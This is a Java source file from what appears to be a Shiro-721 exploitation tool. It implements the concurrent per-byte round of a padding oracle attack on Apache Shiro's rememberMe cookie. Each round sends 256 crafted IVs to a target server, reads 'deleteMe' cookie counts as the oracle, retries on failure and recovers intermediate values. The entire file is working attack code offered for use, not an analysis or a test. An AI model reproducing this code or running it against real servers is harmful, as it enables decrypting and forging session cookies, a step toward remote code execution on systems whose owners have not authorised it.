package com.y5neko.shiroexp.misc;

import com.y5neko.shiroexp.request.shiro721.HttpRequest;
import com.y5neko.shiroexp.request.shiro721.HttpRequestInfo;

import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * RoundTask - Padding Oracle 攻击的并发轮询任务
 *
 * 每个 RoundTask 负责破解一个字节（16 字节块中的一个位置）
 * 通过并发测试 256 个可能的值来找到正确的中间值
 */
public class RoundTask {
    private int threads;
    private String cipherText;
    private int position;
    private String rememberMe;
    private StringBuffer intermediary;
    private String suffix;
    private HttpRequestInfo httpRequestInfo;

    /**
     * 构造函数（使用默认单线程）
     * @param httpRequestInfo HTTP 请求信息
     * @param position 当前位置（1-16）
     * @param cipherText 当前密文块
     * @param intermediary 中间值缓冲区
     */
    public RoundTask(HttpRequestInfo httpRequestInfo, int position, String cipherText, StringBuffer intermediary) {
        this(httpRequestInfo, position, cipherText, intermediary, 1);
    }

    /**
     * 构造函数（支持自定义线程数）
     * @param httpRequestInfo HTTP 请求信息
     * @param position 当前位置（1-16）
     * @param cipherText 当前密文块
     * @param intermediary 中间值缓冲区
     * @param threadCount 线程数（1-16）
     */
    public RoundTask(HttpRequestInfo httpRequestInfo, int position, String cipherText,
                     StringBuffer intermediary, int threadCount) {
        // 限制线程数在 1-16 之间
        this.threads = Math.max(1, Math.min(16, threadCount));
        this.httpRequestInfo = httpRequestInfo;
        this.cipherText = cipherText;
        this.position = position;
        this.rememberMe = httpRequestInfo.getRememberMeCookie();
        this.intermediary = intermediary;
        this.suffix = Shiro721Tools.xor(intermediary.toString(), Shiro721Tools.generateSuffix(position));
    }

    /**
     * 启动并发攻击任务
     *
     * 工作原理：
     * 1. 创建固定大小的线程池
     * 2. 并发测试 256 个可能的字节值
     * 3. 找到第一个满足 Padding Oracle 条件的值
     * 4. 计算对应的中间值并插入缓冲区
     *
     * 重试机制：
     * 如果由于网络原因没有找到有效值，会重试最多 5 次
     */
    public void start() {
        int retry = 5;
        final boolean[] found = {false};

        // 增加 do...while 循环，如果由于网络原因某一轮 round 没有找到，重新尝试，最多尝试 5 次
        do {
            final CountDownLatch latch = new CountDownLatch(256);
            final ExecutorService executor = Executors.newFixedThreadPool(this.threads);

            // 重置索引
            final AtomicInteger index = new AtomicInteger(0);

            // 并发测试 256 个可能的值
            for (int a = 0; a < 256; a++) {
                if (!executor.isShutdown()) {
                    executor.execute(new Runnable() {
                        @Override
                        public void run() {
                            int j = index.getAndIncrement();

                            String hex = Integer.toHexString(j);
                            if (hex.length() == 1) {
                                hex = 0 + hex;
                            }

                            // 构造测试 IV
                            String ivString = "00000000000000000000000000000000".substring(2 * position) +
                                            hex +
                                            suffix;
                            String paddingOraclePayload = Shiro721Tools.generatePayload(rememberMe, ivString, cipherText);

                            // 测试是否触发 Padding Oracle
                            if (HttpRequest.getDeleteMeCount(httpRequestInfo, paddingOraclePayload) <
                                Shiro721Tools.deleteMeBaseCount) {

                                // position=1 的时候有非常低的概率可能是满足 0x02 0x02 类似形式的 padding，需要排除这种可能
                                if (position == 1) {
                                    ivString = ivString.substring(0, 28) + "01" + ivString.substring(30);
                                    paddingOraclePayload = Shiro721Tools.generatePayload(rememberMe, ivString, cipherText);

                                    if (HttpRequest.getDeleteMeCount(httpRequestInfo, paddingOraclePayload) <
                                        Shiro721Tools.deleteMeBaseCount) {
                                        found[0] = true;

                                        synchronized (RoundTask.class) {
                                            intermediary.insert(0, Shiro721Tools.xor(Integer.toHexString(position), ivString));
                                            shutdownExecutor(executor, latch);
                                        }
                                    }
                                } else {
                                    found[0] = true;

                                    synchronized (RoundTask.class) {
                                        intermediary.insert(0, Shiro721Tools.xor(
                                            Integer.toHexString(position),
                                            ivString.substring(32 - 2 * position, 32 - 2 * position + 2)
                                        ));
                                        shutdownExecutor(executor, latch);
                                    }
                                }
                            }

                            latch.countDown();
                        }
                    });
                }
            }

            try {
                // 等待所有任务完成（最多 30 秒）
                boolean completed = latch.await(30, TimeUnit.SECONDS);

                if (!completed) {
                    // 超时，强制关闭线程池
                    executor.shutdownNow();
                } else {
                    executor.shutdown();
                }

                // 等待线程池完全关闭
                if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
                    executor.shutdownNow();
                }

            } catch (InterruptedException e) {
                executor.shutdownNow();
                Thread.currentThread().interrupt();
            }

            retry--;

        } while (!found[0] && retry > 0);
    }

    /**
     * 关闭线程池并减少倒计数
     * @param executor 线程池
     * @param latch 倒计数门闩
     */
    private void shutdownExecutor(ExecutorService executor, CountDownLatch latch) {
        executor.shutdownNow();
        while (latch.getCount() > 0) {
            latch.countDown();
        }
    }

    /**
     * 获取当前线程数
     * @return 线程数
     */
    public int getThreadCount() {
        return threads;
    }
}
